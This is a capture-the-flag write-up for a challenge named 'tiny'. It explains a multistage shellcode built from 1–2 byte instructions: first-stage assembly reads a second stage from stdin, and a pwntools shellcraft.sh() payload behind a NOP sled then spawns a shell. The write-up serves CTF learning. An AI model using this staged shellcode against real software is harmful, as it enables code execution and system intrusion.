# tiny
The goal is to "pop a shell with a shellcode made of 1 or 2 bytes instructions" in order to read the flag.

## Context
- The shellcode is read from `stdin`.

## Approach
The idea is to use a multistage shellcode.

In the first stage we call the syscall read in order to read the second stage from stdin.
```{asm}
    xor edi, edi   ; clear out the edi register (fd for stdin)
    push rdx       ; push rdx into the stack (in this way we are writing on top of the first stage)
    pop rsi        ; pop it into rsi (buffer address)
    push 100       ; push 100 into the stack (number of bytes to read)
    pop dx         ; pop it into dx
    syscall
```
- `rax` register is already set to zero.
- We use the combination `push` - `pop` instead of `move` in order to have instruction with less than 2 bytes.

In the second stage, we simply pop a shell using shellcraft.sh() from the pwntools library. 
- To ensure the correct execution we have to put a nopsled since the `rip` will point right after the first stage and we are writing at the beginning of the first stage. The nopsled must be at least of the dimension of the first stage.
